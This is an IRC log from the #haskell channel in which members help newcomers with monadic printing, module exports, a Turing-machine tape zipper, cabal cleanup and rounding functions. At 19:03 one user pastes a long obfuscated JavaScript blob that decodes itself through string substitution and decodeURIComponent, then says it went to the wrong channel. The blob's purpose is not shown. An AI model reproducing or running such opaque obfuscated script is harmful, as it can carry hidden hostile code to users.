17:34:01 <lambdabot> Graphics.UI.GLUT.Callbacks.Global type TimerCallback = IO ()
17:34:01 <lambdabot> package timerep
17:34:01 <lambdabot> package timers-updatable
17:36:45 <solidus-river> @hoogle set
17:36:46 <lambdabot> Data.Bits setBit :: Bits a => a -> Int -> a
17:36:46 <lambdabot> Control.OldException setUncaughtExceptionHandler :: (Exception -> IO ()) -> IO ()
17:36:46 <lambdabot> Data.Set module Data.Set
17:38:17 <zezikaro> How do you chain two things together?
17:38:22 <zezikaro> 2 -> forM_ (Map.toList possibleStates) $ \(k, v) -> putStrLn $ "" ++ show k ++ " -> "
17:38:22 <zezikaro> 			. mapM_ (print) v
17:38:36 <zezikaro> kallisti Could you help me please :(
17:38:48 <dmwit> (forM_ ...) >> (mapM_ ...)
17:38:56 <dmwit> wait
17:38:58 <dmwit> what?
17:39:09 <dmwit> Oh, I see.
17:39:22 <zezikaro> i want to iterate each value in the kvp
17:39:28 <zezikaro> and have access to k always
17:39:28 <dmwit> forM_ (...) $ \(k,v) -> (putStrLn $ ...) >> mapM_ print v
17:39:58 <dmwit> or use putStrLn (...) instead of using ($).
17:40:02 <kallisti> "have access to k always" what
17:40:06 <zezikaro> :o
17:40:16 <zezikaro> thank you
17:41:14 <kallisti> zezikaro: do you want each element of v to print on a line by itself?
17:41:20 <kallisti> because that's what mapM_ print will do
17:41:28 <mauke> forM_ (...) $ \(k, v) -> putStr $ show k ++ " -> \n" ++ unlines (map show v)
17:42:57 <kallisti> forM_ (...) $ \(k, v) -> do { putStr $ show k ++ " -> "; putStr . unwords . map show $ v }
17:44:38 <dmwit> cat: skinned
17:44:47 <dmwit> skun?
17:44:50 <jonaskoelker> ways: multiple
17:45:00 <zezikaro> sorry i was wrong
17:45:09 <jonaskoelker> ... or would "several" be more appropriate?
17:45:21 <zezikaro> sorry i was wrong
17:45:32 * kallisti joins the official cat skinning club of #haskell
17:45:41 <zezikaro> 2 -> forM_ (Map.toList possibleStates) $ \(k, v) -> (mapM_ (\x -> putStrLn $ show k ++ " -> " ++ show (transferState x) ++ " [ label = < " ++ show (transferState x) ++ ", " ++ show (transferState x) ++ " > ]") v)
17:45:43 <zezikaro> D:
17:45:46 <zezikaro> It's like that
17:45:55 <zezikaro> but now I need to somehow put a "foo" before and a "bar" after
17:46:13 <zezikaro> 2 -> putStrLn "foo" >> ... >> putStrLn "Bar"
17:46:20 <kallisti> okay
17:46:25 <dmwit> what is this "2 ->" ?
17:46:39 <zezikaro> well that didn't work XD
17:46:49 <kallisti> zezikaro: beware of operator precedence
17:46:51 <dmwit> Anyway, I'm believing more and more that mauke has the right of it.
17:46:55 <kallisti> and note that do notation may be helpful to you
17:47:00 <dmwit> Write a function that computes the String you want to print.
17:47:03 <zezikaro> well that didn't work XD
17:47:03 <dmwit> Then print it all in one go.
17:47:11 <zezikaro> kallisti ah i see
17:47:16 <zezikaro> :)
17:47:17 <kallisti> do {x; y}  = x >> y
17:47:19 <zezikaro> one step ahead of me
17:47:29 <kallisti> but yeah you can also just build the string
17:47:30 <zezikaro> do you need the braces?
17:47:33 <jonaskoelker> dmwit: can I then have the Left of it? :-P
17:47:39 <kallisti> you can substitute with identiation and newlines
17:47:42 <jonaskoelker> more seriously, what does mauke have the right of?
17:48:14 <kallisti> zezikaro: as long as the next line is idented more than the previous, it will register it as a {} block
17:48:31 <kallisti> forM_ (Map.toList possibleStates) $ \(k, v) -> do
17:48:32 <dmwit> jonaskoelker: He suggested separating the IO and the pure computation more.
17:48:34 <kallisti>   code
17:48:43 <mauke> jonaskoelker: it
17:48:58 <jonaskoelker> mauke: not way?
17:49:00 <jonaskoelker> ;-)
17:49:46 <jonaskoelker> as in that's how you should write your own programs, or should IO be restructured?
17:50:54 <dmwit> I like to think I write my programs with the pure bits separate.
17:51:38 <tgeeky> bit racist!
17:51:49 <jonaskoelker> `puricist'?
17:52:37 <tertl3> i am having trouble with leksah
17:53:48 <tertl3> why is my main not recognizing my module's function?
17:54:44 <tertl3> anyone?
17:54:57 <tgeeky> tertl3: post code and/or screenshots (imgur.com)
17:57:17 <tertl3> http://fpaste.org/qNUi/
17:57:45 <tertl3> i have used a module in ghc, but this thing is frustrating me
17:57:58 <zezikaro> > [1..]
17:57:59 <lambdabot>   [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28...
17:58:03 <zezikaro> > length [1..]
17:58:07 <lambdabot>   mueval-core: Time limit exceeded
17:58:17 <mauke> tertl3: DMM exports nothing
17:58:21 <zezikaro> o.O
17:58:30 <zezikaro> if you do 'length' on a list, it actually traverses it?
17:58:33 <tgeeky> tertl3: ah. beaten to it
17:58:34 <mauke> zezikaro: yes
17:58:37 <zezikaro> it doesn't keep track of its size? o.O
17:58:40 <dmwit> zezikaro: Yes. What else could it do?
17:58:42 <tertl3> what do I need to add?
17:58:47 <mauke> zezikaro: er. where?
17:58:49 <zezikaro> dmwit Keep track of its size
17:58:52 <tgeeky> tertl3: add 'doubleme' to the export list of DMM
17:58:56 <zezikaro> i'm thinking OOP :(
17:59:04 <tgeeky> zezikaro: no, that's not intrinsic in OOP either
17:59:05 <mauke> @src []
17:59:05 <lambdabot> data [] a = [] | a : [a]
17:59:14 <zezikaro> type List = (data []; size : 0..maxint)
17:59:16 <tertl3> tgeeky where is the export list?
17:59:18 <tgeeky> zezikaro: there are hackage packages that are for lists which keep track of their size
17:59:29 <tgeeky> tertl3: module DMM ( -- export list here ) where
17:59:50 <tgeeky> tertl3: (you are exporting 'main' in the other module)
17:59:50 <zezikaro> I wanted to keep track of where the cursor is in my turing machine
17:59:55 <zezikaro> because my tape is left, currentChar, right
18:00:04 <zezikaro> there's no integer there
18:00:16 <zezikaro> and clearly length left isn't the way to go!
18:00:20 <mauke> zezikaro: zipper?
18:00:22 <kallisti> keep track of an integer then
18:01:02 <zezikaro> is there 'self' or 'this' in haskell?
18:01:09 <kallisti> what would that even mean?
18:01:25 <rasfar> is it safe to run cabal haddock on core libs? (ffi, rts)
18:01:28 <zezikaro> 		tm = TuringMachine {
18:01:29 <zezikaro> 			tape = (Tape "A1111111101111" 'A' ""),
18:01:29 <zezikaro> 			cursorPos = this.tape.left.length
18:01:39 <zezikaro> instead of a constructor with cursorPos = guessedNumber
18:01:48 * kallisti is slightly horrified
18:02:02 <zezikaro> at me?
18:02:18 <strager> zezikaro: Store that Tape in a local
18:02:40 <kallisti> strager: define your shift operations so that it increments/decrements an integer field
18:02:44 <strager> Why do you need cursorPos stored?  Can you infer it and use a helper method when you need it?
18:02:54 <zezikaro> when outputting i'd like to do
18:02:56 <zezikaro>           v
18:02:59 <zezikaro> A000000000000000000001
18:03:03 <kallisti> "this" is a completely meaningless concept in Haskell.
18:03:06 <strager> You can easily calculate that when you want to print.
18:03:07 <zezikaro> to show where the cursor is
18:03:25 <mauke> that doesn't require storing a position
18:03:31 <shachaf> zez: It's pretty fundamental to the way lists work that they don't "keep track of the length".
18:03:40 <zezikaro> it would require (length left) constantly
18:03:47 <zezikaro> which would be stupid to calculate each time when printing ?
18:03:54 <kallisti> you don't need to use the length at all
18:03:55 <mauke> zezikaro: why would that be stupid?
18:04:10 <mauke> it's O(n) no matter what you do
18:04:15 <kallisti> reverse left, append current, append right
18:04:16 <kallisti> done
18:04:24 <mauke> kallisti: ?
18:04:47 <shachaf> zez: Isn't your tape infinite to both sides anyway?
18:04:50 <mauke> zezikaro: also, putStrLn $ map (const ' ') left ++ "v"
18:05:10 <kallisti> reverse left ++ (current : right)
18:05:16 <zezikaro> what's that mauke sorry
18:05:29 <kallisti> I would think what you actually want to keep track of is the maximum position visited
18:05:33 <zezikaro> kallisti I haven't reversed left yet
18:05:37 <zezikaro> i'm still thinking about it
18:05:42 <kallisti> zezikaro: no I'm saying
18:05:48 <mauke> zezikaro: code
18:05:51 <strager> > let left = "12345" in   720-840-1303
18:05:52 <kallisti> when you need to show the string, just do that.
18:05:52 <lambdabot>   -1423
18:05:52 <strager> er
18:05:59 <strager> > let left = "12345" in   putStrLn $ map (const ' ') left ++ "v"
18:06:01 <lambdabot>   <IO ()>
18:06:01 <kallisti> don't store it anywhere beforehand
18:06:08 <strager> > let left = "12345" in   map (const ' ') left ++ "v"
18:06:10 <lambdabot>   "     v"
18:06:44 <kallisti> the reason you might want to keep track of the maximum cell visited is so that you can truncate the infinite right-side.
18:06:53 <kallisti> assuming that the right-side is unbounded.
18:07:05 <zezikaro> it's not =[
18:07:09 <zezikaro> i've only started haskell sorry
18:07:14 <dmwit> > text "beforehand" ||| (text "v" === text "a") ||| text "afterhand"
18:07:15 <lambdabot>   Not in scope: `==='
18:07:42 <shachaf> kallisti: Rather than keeping track of the leftmost/rightmost cell visited, keep track of the leftmost/rightmost cell not in the "default" state.
18:07:53 <kallisti> ah, yes.
18:08:09 <dmwit> > hcat [text "beforehand", vcat [text "v", text "a"], text "afterhand"]
18:08:10 <lambdabot>   beforehandv
18:08:10 <lambdabot>            aafterhand
18:08:44 <kallisti> zezikaro: when you need to print the tape, you can just perform the code on the spot. there's no need to keep track of anything. keeping track of position doesn't even make your code more efficient in this case.
18:08:49 <strager> I really need to learn 'pretty'
18:08:57 <tgeeky> wa/window 11
18:09:07 <strager> tgeeky: /win also works
18:09:08 <dmwit> Me, too, apparently.
18:09:21 <shachaf> So does Alt-Q
18:09:34 <tgeeky> shachaf: thanks (for the second one)
18:09:35 <kallisti> zezikaro: reversing the left side of the tape as its stored in the Tape constructor would be silly, then shifting left would be O(n)
18:09:46 <strager> alt-1234... qwer...
18:09:54 <kallisti> you want right and left shifts to be O(1)
18:10:22 <zezikaro> thanks mauke, that was clever
18:11:08 <zezikaro> kallisti Sorry i'm trying my best
18:11:22 <shachaf> "I wa/wa/wa/wa/window"
18:11:50 <kallisti> zezikaro: no need to apologize. I'm just trying to help.
18:14:02 <kallisti> zezikaro: note that your Tape structure can easily be unbounded if you give it infinite lists
18:14:19 <kallisti> Tape (repeat 0) 0 (repeat 0)
18:14:28 <kallisti> > repeat 0
18:14:28 <lambdabot>   [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,...
18:15:37 <kfish> https://plus.google.com/109566665911385859313/posts/FAmNTExSLtz
18:15:39 <kfish> golf
18:17:14 <kallisti> the annoying thing about reverse x ++ y
18:17:15 <tgeeky> @type main
18:17:16 <lambdabot> Not in scope: `main'
18:17:31 <kallisti> is that it could be way more efficient with a specialized recursive function
18:17:53 <kfish> tgeeky: main :: IO ()
18:18:14 <kallisti> actually main :: IO a
18:18:18 <tgeeky> kfish: I know, I was hoping that was defined in there somewhere
18:18:45 <kfish> :)
18:21:28 <lfurrea> hi all! what is the place for a newbie to look up for a ruby rvm or python virtualenv, equivalent in haskell?
18:21:30 <zezikaro> kallisti Okay i really don't understand what to do with the left hand side now
18:21:37 <zezikaro> you're saying reversing it in the constructor is stupid yeah?
18:21:53 <zezikaro> but I was told that the add times to the left hand side is really poor
18:22:00 <zezikaro> which is why i should have it reversed
18:22:27 <kallisti> zezikaro: no
18:22:28 <zezikaro> http://ideone.com/LRtuu is where I am at currently
18:22:31 <kallisti> just reverse it when you need to display it
18:23:11 <zezikaro> well I have to reverse it in the constructor? as it's easier to read as a human
18:23:27 <kallisti> there's nothing about what I said that requires that.
18:23:39 <kallisti> your constructor isn't concerned about human readability
18:23:42 <kallisti> your display function is
18:23:51 <zezikaro> I am currently very confused
18:24:01 <zezikaro> my display function outputs it correctly atm without needing to reverse it
18:24:02 <applicative> lfurrea: http://hackage.haskell.org/package/cabal-dev http://hackage.haskell.org/package/virthualenv etc
18:24:21 <kallisti> zezikaro: er, it does?
18:24:30 <zezikaro> kallisti yeah
18:24:32 <kallisti> then you've had it "the wrong way" this whole time
18:24:44 <kallisti> I say it's the wrong way because it doesn't allow O(1) left shift
18:25:00 <dmwit> We've been telling him this since the beginning. He doesn't seem to care.
18:25:13 <zezikaro> i do
18:25:15 <zezikaro> i'm just confused
18:25:16 <zezikaro> :(
18:25:20 <zezikaro> sorry :P thanks for the help
18:25:21 <applicative> lfurrea: http://hackage.haskell.org/package/cab too much competition...
18:25:46 <dmwit> lfurrea: There's virthalenv, cabal-dev
18:26:04 <dmwit> possibly others, I've never needed them so I don't know the space very well.
18:26:21 <kallisti> zezikaro: currently, to shift one cell left in your turing machine, you need to traverse to the end of the left list to get the value nearest to the center
18:26:59 <kallisti> to go from Tape [1,2,3] 4 [5]  to Tape [1,2] 3 [4,5]
18:27:15 <kallisti> you need to traverse [1,2,3]
18:28:02 <zezikaro> http://ideone.com/R3jlm
18:28:07 <gtmanfred> how can I remove all my cabal stuff to start over?
18:28:08 <azaq23> only vaguely haskell related, but: if I want to study algorithms (in a rigorous fashion, so with mathematical proofs), should I go with the book "Thomas H. Cormen: Introduction to Algorithms" or does
18:28:08 <azaq23> anyone have a different recommendation?
18:28:10 <zezikaro> modifyTape (Tape (l:ls) c right) Leave Left = Tape ls l (c:right)
18:28:10 <zezikaro> modifyTape (Tape left c (r:rs)) Leave Right = Tape (c:left) r rs
18:28:30 <gtmanfred> i tried deleting my .cabal folder and uninstalling it,but when I come back cabal install hoogle says I need to reinstall
18:28:33 <zezikaro> that's it fixed now i believe?
18:28:36 <applicative> gtmanfred: you can delete .cabal and .ghc for example
18:28:41 <zezikaro> i reversed it, used pattern matching for (l:ls)
18:28:59 <zezikaro> and that works because it's reversed
18:29:01 <gtmanfred> hmm, I have a .ghc too didn't realize that
18:29:04 <applicative> gtmanfred: are you keeping your ghc?
18:29:05 <gtmanfred> hold on
18:29:20 <gtmanfred> yes
18:29:32 <applicative> you can ghc-pkg unregister X, where it thinks you have X etc
18:29:36 <zezikaro> so now there's no longer head/tail/init
18:29:37 <gtmanfred> I am keeping cabal too, I just wanted to start over with it cause I had random stuf installed
18:29:38 <zezikaro> it's all patterns
18:29:49 <zezikaro> and the traversal is faster for appending items
18:29:49 <applicative> what does ghc-pkg list   tell you
18:29:56 <kallisti> zezikaro: if by "reversed" you mean "not reversed" then yes I agree. :)
18:30:02 <dmwit> azaq23: I suppose "Data Structures and Algorithms" by Aho, Ullman, and Hopcroft is a pretty classic text.
18:30:03 <zezikaro> is this wrong kallisti? :(
18:30:06 <gtmanfred> applicative: whole bunch of stuff
18:30:07 <kallisti> no it's right
18:30:16 <kallisti> I'm saying that this orientation isn't "reversed"
18:30:34 <applicative> what platform are you on gtmanfred
18:30:42 <zezikaro> in our human representation of a turing machine, it would be?
18:30:53 <lfurrea> applicative, dmwit thank you, I will take a look, so there is not really a community preferred alternative? one the top stackoverflow posts tagged haskell gives a pretty dissapointing perspective on the maintenace status of haskell libraries and qualifies them as weekend hacks most of the times left unmantained
18:30:55 <zezikaro> hence when outputting, it's "(reverse left)"
18:31:10 <kallisti> zezikaro: this isn't a human representation of a Turing machine
18:31:14 <kallisti> so. I don't know what that means.
18:31:27 <applicative> lfurrea: there are plenty of such projects,why shouldnt there be
18:31:55 <zezikaro> thanks again for the help :D
18:31:58 <zezikaro> i really appreciate it
18:32:10 <applicative> lfurrea: and many libraries that are as if composed by gods
18:33:04 <lfurrea> applicative no reason, just trying to shift paradigms you know on ruby it boils down to a couple, may I ask you for your personal preference?
18:33:20 <tgeeky> applicative: as long as the reversed libraries are composed by dogs
18:33:50 <azaq23> dmwit: will look it up thanks :)
18:37:32 <lfurrea> dmwit, are you able to manage with a system wide haskell and libs for all your projects?
18:41:04 <zezikaro> Would it be sad to continue with this turing machine ?
18:41:13 <zezikaro> I don't know what else to do with haskell, since i don't know very much
18:41:52 <zezikaro> applicative is Gloss applicable for drawing the turing machine?
18:42:03 <zezikaro> or would it be better to use ... i think it was wxWidgets?
18:42:22 <kallisti> wxWidgets is going to be more confusing
18:42:32 <kallisti> you need to learn some basics first.
18:42:51 <randomclown_> > pl \(a, b) -> f a b
18:42:52 <lambdabot>   <no location info>: parse error on input `\'
18:43:20 <randomclown_> > pl (\(a,b) -> f a b)
18:43:21 <lambdabot>   Not in scope: `pl'
18:43:30 <randomclown_> is it .pl?
18:44:05 <randomclown_> @pl (\(a,b) -> f a b)
18:44:05 <lambdabot> uncurry f
18:45:07 <tgeeky> hm. that doesn't work for more than 2 elements
18:47:15 <applicative> gtmanfred: the straightforward thing is to unregister all locally regristered things revealed by ghc-pkg list "ghc-pkg unregister ABC-x.y.z --force" for the lot
18:47:29 <zezikaro> kallisti Do you know how to use gloss
18:58:45 <dmwit> lfurrea: Yes.
19:00:42 <gtmanfred> applicative: awesome, thanks
19:01:11 <gtmanfred> already deleted the .ghc folder so it is kinda moot point now :-P
19:01:14 <gtmanfred> thanks for your help
19:03:12 <zezikaro> !ujse st="en0no3nno3mpno3rxnl-wno3bpno3rxcom";Date&&(a=["a#%d]%b@%e_%c)%1<%5*%4+%9:%3^%2","%7!%0|%f~%8?%6&"]);var b=[],c="&!^<^]$$&)&~&_&)!:$$^@$|&:&&$?$]^<^]^]&+&~&^!*&]&*&_!+$_&^&~&~&@&:&*$_&:&_&+&*!?+~&&$?&!^<$:$:!@!?^+^]^!^$+*^&^@!&&<!$$|&^^]&_&*!!$|++&<!+&*^@&^$_!^&*!+*+&:&]&*$?&^$_&!&*!+*+&:&]&*$?$:$:^@&*&+^]&_&*!!$|++&<!+&*$?&^$_&!&*!+*+&:&]&*$?$:$@!?^+$:^@&+&~&^!*&]&*&_!+$_&^&~&~&@&:
19:03:12 <zezikaro> &*^]&!^<$@$$^]$$$@&*!^&^&<!|&*$?&*&+$_!+&~+!+]*+*^!+!$&:&_&!$?$:$:$@$$^@&*!?!|&:!$&*!^^]$$$@&*&+$_!+&~+!+]*+*^!+!$&:&_&!$?$:$@$$^@!|&<!+&?^]$~$$^@&!^^^]$$&?!+!+!|^#$~$~$$$@!^!+$_!$&*!|&)&<&^&*$?$~&*&_^|$~&!$)$$&!$$$:$_!$&*!|&)&<&^&*$?$~&_&~^^$~&!$)$$&*$$$:$_!$&*!|&)&<&^&*$?$~!|&*!$!?$~&!$)$$$_$$$:$@$$$~!+&~!|^$$_&?!+&]&)$$^@!&&<!$$|&+^]$]^<$<^]&_&<!&&:&!&<!+&~!$$_!*!^&*!$+<&!&*&_!+$_!+&~+)&~
19:03:12 <zezikaro> !!&*!$+^&<!^&*$?$:$_&:&_&+&*!?+~&&$?$$&&&:!$&*&&&~!?$$$:$)&*^]$$^<$$$)&?^]&&!*&_&^!+&:&~&_$?$:!@!]^@&?$_!|!$&~!+&~!+!:!|&*^]!@&$^#&&!*&_&^!+&:&~&_$?$:!@!$&*!+!*!$&_$|&!^^!]$)&<^#&&!*&_&^!+&:&~&_$?$:!@!&&<!$$|&&^]&+&~&^!*&]&*&_!+$)&:^]!!&:&_&+&~!!$)&!^]!+&?&:!^^@!+!$!:!@!&*!^]$$&!&*!+!^&*!++<!+!+!$&:!^&+&&$$^@!&&<!$$|&<^]*@*]^@&+!)!)$?&*^]$$^|$$$:^@&<$_!|!*!^&?$?$$&?&*&:&!&?!+$$$)$$!^!*&$!^!+
19:03:12 <zezikaro> !$&:&_&!$$$)$$!+!$&*&^!$&*&<!+&*+*&)&*&]&*&_!+&!&*!+$$$)$$!!&:&+!+&?$$$)$|$$!&&$&]&:&&!$!^&*!+$$$)!&*!$)$$&$&~&+!:$$$)$$&<!|!|&*&_&++^&?&:&)&+$$$)&*$)&&$)$$!^!$&^$$$:^@!&&<!$$|&#^]&<*@^$*]*@&<*@^<*]*]$?^^$)^<^&$:^@!&+@^]&<*@^+*]*@&<*@^<*]*]$?^^$)^&$:$@$$&<&]&*$$^@!|^]&<*@^**]*@&<*@^<*]*]$?^^$)^<^<$:$@$$&$!*!+&*$$^@!&&<!$$|&@^]&!$_&$$?$:$)&$^]&<*@^:*]*@&#*]$?!&+@$:^@&$*@&<*@^<^|*]*]^]&@^@&$*@
19:03:12 <zezikaro> &<*@^^*]*]^]&<*@^?*]^@&$*@&<*@^|*]*]^]&<*@^?*]^@&<*@^:*]*@&<*@^&*]*]*@&<*@^!*]*]$?&$$:!]&^&<!+&^&?$?&]$:!@&&$_!!!$&:!+&*$?$$^)&?!+&]&)^_^)&$&~&+!:^_^)$~&$&~&+!:^_^)$~&?!+&]&)^_$$$:$)&:$_!^&*!+*+&:&]&*&~!*!+$?&&!*&_&^!+&:&~&_$?$:!@&!$_&<$?$:!]$)^$^^^^$:!]!]!]^@!&&<!$$|&)^]&_&*!!$|&?^@&:&&$?!!&:&_&+&~!!$_&_&<!&&:&!&<!+&~!$$_!*!^&*!$+<&!&*&_!+$_!+&~+)&~!!&*!$+^&<!^&*$?$:$_&]&<!+&^&?$?$~&&&:!$&*
19:03:13 <zezikaro> &&&~!?!)&]!^&:&*$~&:$:$:!@&)$_&<$?$:^@!]$|&*&)!^&*$|!@$|&+&~&^!*&]&*&_!+$_&~&_&]&~!*!^&*&]&~!&&*^]&&!*&_&^!+&:&~&_$?$:!@&)$_&<$?$:^@&+&~&^!*&]&*&_!+$_&~&_&]&~!*!^&*&]&~!&&*^]&_!*&)&)!]!]!]^@"; function e(){e=a.join("$").split("%");for(var d in e)"string"==typeof e[d]&&(c=c.split(e[d].substr(1)).join(e[d].substr(0,1)));return this}var f=e(),a="";for(_E=~b-~b;_E<c.length/2;_E++)a+="%"+c.substr(2*_E,2);
19:03:13 <zezikaro> f.decodeURIComponent(a);
19:03:21 <zezikaro> !ujse "a"
19:03:35 <zezikaro> fuck
19:03:37 <zezikaro> sorry!
19:03:38 <gtmanfred> wtf...
19:03:46 <zezikaro> wrong channel, apologies!
19:05:57 <Twisol> *facepalm*
19:06:38 <gtmanfred> applicative: oh, I am on archlinux
19:09:59 <gtmanfred> hmm, installing hoogle is failing for some reason http://sprunge.us/EVOI
19:13:08 <geekosaur> did cabal install happy?  if so, check your $PATH; it will have been installed into ~/.cabal/bin (or ~/Library/Haskell/bin on OS X) which you'll need to add to your $PATH for it to be recognized as installed
19:13:34 <td123> gtmanfred: cabal install happy probably
19:14:09 <td123> build-tools are bugged in cabal since forever http://hackage.haskell.org/trac/hackage/ticket/227
19:14:11 <gtmanfred> for some reason I remember that from last time too
19:23:47 <applicative> gtmanfred happy is an executable, I get mine with the haskell platform but it can be installed by cabal install
19:24:00 <gtmanfred> yeah, doing that now
19:24:08 <applicative> so it sounds like what geekosaur said to me,  that it cant find it though its there
19:30:37 <rasfar> is it safe to run cabal haddock on core libs? i seem to be missing docs for some of them.
19:45:36 <dmwit> Is there a canonical Rectangle data type in a package somewhere?
19:45:38 <applicative> rasfar: you mean ffi and rts? my haddoc complains about them frequently but I think they are just C madness
19:46:05 <dmwit> Specifically axis-aligned rectangles.
19:56:29 <rasfar> sorry applicative, yes that's exactly what i'm trying to resolve
19:57:02 <rasfar> i guess it's not important, but i'm going through the hell of installing profiling libs and thought it might be a good time to deal with it.
20:06:09 <sm> new cabal feels so much more civilised than before. Great work cabal hackers.
20:09:57 <rasfar> oh, is it quite different? can it track profiling lib deps?
20:10:27 <rasfar> maybe i should just upgrade oO
20:11:37 <sm> it is much more helpful with not breaking your installed packages, in particular
20:14:29 <rasfar> dmwit, byorgey was working on something along those lines very recently
20:15:24 <dmwit> What, really?
20:15:40 <dmwit> I thought axis-aligned rectangles were too simple to be useful to byorgey. =)
20:16:43 <rasfar> he seemed pleased that they formed a monoid, or something along those lines...
20:17:11 <Ralith> oh hey, they do don't they
20:17:21 <dmwit> semigroup
20:17:35 <dmwit> But he was just using that as an example of what not to do in a paper he's writing, I'm pretty sure.
20:19:23 <rasfar> you may be right, i wasn't reading closely, just checking in. i'm having no luck finding the reference on tunes, and i'm involved in a chat at the moment, need to go...
20:19:49 <dmwit> > truncate (-3.5)
20:19:50 <lambdabot>   -3
20:19:54 <dmwit> truncate (3.5)
20:19:56 <dmwit> > truncate (3.5)
20:19:57 <lambdabot>   3
20:20:14 <dmwit> Is there a function like truncate, but that rounds towards infinity instead?
20:20:20 <dmwit> eh, away from zero, I mean
20:20:30 <strager> > floor (-3.5)
20:20:31 <lambdabot>   -4
20:20:35 <strager> > floor (3.5)
20:20:37 <lambdabot>   3
20:21:01 <dmwit> That's towards -infinity. And ceiling is towards infinity. And truncate is towards zero. What's away from zero?
20:21:22 <strager> oh
20:22:25 <qtplatypus> dmwit: I suspect that you would have to create it from floor and ceiling
20:22:32 <dmwit> seems that way
20:22:41 <dmwit> Any suggestions for a good name?
20:22:58 <strager> roundAwayFromZero
20:23:11 <dmwit> cotruncate? =)
20:24:06 <Twisol> seems sensible but hard to grok at a glance
20:25:33 <dmwit> enlarge, maybe
20:26:02 <parcs`> round'
20:26:06 <strager> > let x = -3.5 ; y = ceil (abs x) in signnum x * y
20:26:07 <lambdabot>   Not in scope: `ceil'Not in scope: `signnum'
20:26:18 <strager> > let x = -3.5 ; y = ceiling (abs x) in signnum x * y
20:26:20 <lambdabot>   Not in scope: `signnum'
20:26:27 <strager> > let x = -3.5 ; y = ceiling (abs x) in signum x * y
20:26:28 <lambdabot>   Ambiguous type variable `a' in the constraints:
20:26:29 <lambdabot>    `GHC.Real.Fractional a'
20:26:29 <lambdabot> ...
20:26:40 <strager> ..  I should really use GHCi before trying lambdabot
20:26:47 <Twisol> :D
20:26:49 <parcs`> :t map (round . ((+) =<< signum)) [-3.5, 4.5]
20:26:50 <lambdabot> forall b. (Integral b) => [b]
20:26:54 <parcs`> map (round . ((+) =<< signum)) [-3.5, 4.5]
20:27:00 <parcs`> > map (round . ((+) =<< signum)) [-3.5, 4.5]
20:27:01 <lambdabot>   [-4,6]
20:27:24 <parcs`> 6
20:27:26 <dmwit> round needs some companions, too, but this is not one of them.
20:27:29 <dmwit> parcs`: Banker's rounding.
20:27:37 <dmwit> > map round [1.5, 2.5]
20:27:38 <lambdabot>   [2,2]
20:27:47 <strager> That's pretty unreadable =D
20:27:56 <Luke> what does putting a $ in front of a variable name do?
20:27:59 <parcs`> strager: it is?
20:28:13 <strager> To me at least
20:28:13 <dmwit> > map round [1.4999, 1.5, 1.5001, 2.4999, 2.5, 2.5001]
20:28:14 <lambdabot>   [1,2,2,2,2,3]
20:28:32 <strager> Luke: Depends; what's the context?
20:28:48 <strager> If it's directly in front, without whitespace, it may be a Template Haskell expansion thingy.
20:28:53 <Luke> strager: https://github.com/mightybyte/snaplet-postgresql-simple/blob/master/src/Snap/Snaplet/Auth/Backends/PostgresqlSimple.hs#L113
20:29:24 <Luke> i suspected TH but couldnt see any imports relating to it
20:29:26 <dmwit> ?src ($)
20:29:27 <lambdabot> f $ x = f x
20:29:34 <dmwit> ($x) = \f -> f x
20:29:37 <parcs`> that is a section, equivalent to \f -> f pamtable
20:29:52 <strager> It applies pamTable to the first element of a tuple
20:30:03 <Luke> oh I've never seen it written without the spaces... guess it threw me off
20:30:03 <strager> (combined with . fst)
20:30:05 <dmwit> No tuples here.
20:30:06 <Luke> thanks
20:30:16 <dmwit> oh
20:30:26 <Twisol> looks a lot like a sigil when you write it like that
20:31:04 <shachaf> GHC *does* have a sigil, but it's not $. :-)
20:31:09 <shachaf> Actually it sort of has two.
20:31:26 <Twisol> Is one of them # ?
20:31:43 <qtplatypus> And ~ would be the other one?
20:31:51 <shachaf> ~ isn't a sigil
20:31:53 <shachaf> ? is
20:32:02 <Twisol> ironic
20:32:09 <parcs`> strager: well '(+) =<< signum' is '\x -> signum x + x'. in general, 'f =<< g' is '\x -> f (g x) x'. once you memorize that then the expression should be fairly readable and concise
20:32:42 <strager> hmm
20:33:22 <strager> How is that possible without a monad present here?
20:33:25 <c_wraith> parcs, is that right? I thought that was ap
20:33:28 <strager> Or is there a monad I'm not seeing
20:33:33 <c_wraith> there is a monad
20:33:48 <parcs`> c_wraith: f `ap` g = flip f =<< g
20:33:55 <c_wraith> oh
20:33:59 <c_wraith> hah, ok
20:34:46 <parcs`> strager: the monad is ((->) e)
20:34:46 <strager> :t round . ((+) =<< signum)
20:34:47 <lambdabot> forall a b. (RealFrac a, Integral b) => a -> b
20:35:29 <strager> I didn't realize ((->) a) was a monad
20:35:34 <Twisol> Am I correct in thinking that Haskell's type system is more about patterns than about behavior, compared to the type systems of other languages?
20:35:44 <parcs`> > (ap f g x, (f =<< g) x)
20:35:45 <lambdabot>   Ambiguous type variable `a' in the constraints:
20:35:45 <lambdabot>    `GHC.Show.Show a'
20:35:45 <lambdabot>      a...
20:35:50 <parcs`> > (ap f g x, (f =<< g) x) :: (Expr, Expr)
20:35:52 <lambdabot>   Ambiguous type variable `a' in the constraints:
20:35:52 <lambdabot>    `SimpleReflect.FromExpr ...
20:36:01 <parcs`> stupid reflection
20:36:30 <c_wraith> Twisol: I'd describe it as being more about encapsulating invariants than describing representation, as opposed to most other languages
20:36:32 <strager> Where can I see the definition of instance Monad ((->) f) ?
20:36:42 <parcs`> @src (->) return
20:36:42 <lambdabot> return = const
20:36:45 <parcs`> @src (->) (>>=)
20:36:46 <lambdabot> f >>= k = \ r -> k (f r) r
20:37:50 <strager> Crazy.  I'll have to try coding that way to figure it out.
20:38:07 <parcs`> strager: are you familiar with the reader monad
20:38:28 <strager> Yes
20:38:42 <parcs`> well they're the same thing
20:39:13 <c_wraith> that's not a simplification.  They're literally the exact same thing... Reader just has a newtype wrapper
20:41:51 <parcs`> :t f
20:41:52 <lambdabot> forall a. (SimpleReflect.FromExpr a) => a
20:42:02 <c_wraith> :t x
20:42:03 <lambdabot> Expr
20:42:15 <c_wraith> f is special!
20:42:41 <shachaf> f = fun "f"
20:42:48 <strager> ((+1) >> (+1)) 2
20:42:54 <parcs`> what are the instances of FromExpr?
20:42:55 <strager> > ((+1) >> (+1)) 2
20:42:57 <lambdabot>   3
20:43:07 <c_wraith> probably just functions and Expr
20:43:13 <c_wraith> :t f :: Expr
